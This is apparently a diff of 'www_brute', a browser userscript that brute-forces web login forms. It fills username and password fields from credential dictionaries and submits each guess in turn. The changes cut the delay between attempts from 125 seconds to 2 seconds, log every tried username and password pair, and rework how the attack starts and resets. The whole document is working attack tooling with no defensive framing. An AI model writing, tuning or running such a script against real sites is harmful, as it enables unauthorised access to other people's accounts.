@@ -5,7 +5,7 @@
 // @grant       none
 // ==/UserScript==
 
-var BRUTE_INTERVAL_MS = 125 * 1000
+var BRUTE_INTERVAL_MS = 2 * 1000
 var user_field, pass_field, submit_field, brute_offset
 var hash
 
@@ -13,9 +13,9 @@ function init()
 {
 	console.info('[!] click on ' + ((user_field) ? '' : '<user> ') + ((pass_field) ? '' : '<pass> ') + ((submit_field) ? '' : '<submit> ') + 'fields' )
 	document.getElementsByTagName('body')[0].addEventListener('click', function (e) {
-  	if(! user_field )
+		if(! user_field )
 		{
-		  user_field = save_element( e.target, 'user' )
+			user_field = save_element( e.target, 'user' )
 			console.log('[*] select <user> field ' + user_field)
 		}
 		else if(! pass_field )
@@ -202,15 +202,15 @@ function is_allow(dict)
 
 function do_brute(intr)
 {
-	if( brute_offset == undefined )
+	/*if( brute_offset == undefined )
 	{
 		save_cookie('__offset=0')
 		brute_offset = 0
 	}
-	else
+	else*/
 		brute_offset = parseInt(brute_offset)
-	var offset = 0
-
+	var offset = 0,
+		user, password
 	for( var dict = 0; dict < window.__brute.length; dict++ )
 	{
 		if(! is_allow( window.__brute[dict] ) )
@@ -219,8 +219,11 @@ function do_brute(intr)
 		{
 			if( brute_offset == offset )
 			{
-				user_field.value = window.__brute[dict].combo[i][0]
-				pass_field.value = window.__brute[dict].combo[i][1]
+				user = window.__brute[dict].combo[i][0]
+				password = window.__brute[dict].combo[i][1]
+				user_field.value = user
+				pass_field.value = password
+				console.log("try " + user + ":" + password)
 				send()
 				return
 			}
@@ -235,8 +238,11 @@ function do_brute(intr)
 				{
 					if( brute_offset == offset )
 					{
-						user_field.value = window.__brute[dict].users[j]
-						pass_field.value = window.__brute[dict].passwords[i]
+						user = window.__brute[dict].users[j]
+						password = window.__brute[dict].passwords[i]
+						user_field.value = user
+						pass_field.value = password
+						console.log("try " + user + ":" + password)
 						send()
 						return
 					}
@@ -275,7 +281,6 @@ function enum_dicts()
 	)
 }
 
-
 function brute()
 {
 	if( location.hash == hash )
@@ -286,10 +291,18 @@ function brute()
 	if( in_url('__reset') )
 	{
 		reset()
+		throw brute_exception("force stoping")
+	}
+
+	if( in_url('__init') )
+	{
+		brute_offset = 0
+		save_cookie('__offset=0')
+		init()
 		return
 	}
-	brute_offset = get_cookie('__offset=')
-	if( ( brute_offset != undefined || in_url('__init') ) )
+
+	if( ( ( brute_offset = get_cookie('__offset=') ) != undefined ) )
 	{
 		function get_userpass_fields()
 		{
@@ -304,14 +317,10 @@ function brute()
 		}
 		get_userpass_fields()
 	}
-	if( in_url('__init') )
-	{
-		init()
-		return
-	}
 }
 
-function frame_exception(mess)
+
+function brute_exception(mess)
 {
 	console.info(mess)
 }
@@ -322,11 +331,11 @@ function in_frame()
 }
 
 if( in_frame() )
-	throw frame_exception('skipping frame')
+	throw brute_exception('skipping frame')
 
 try
 {
-	console.info('www_brute v0.15')
+	console.info('www_brute v0.17')
 	enum_dicts()
 	setInterval( brute, 1000 )
 }
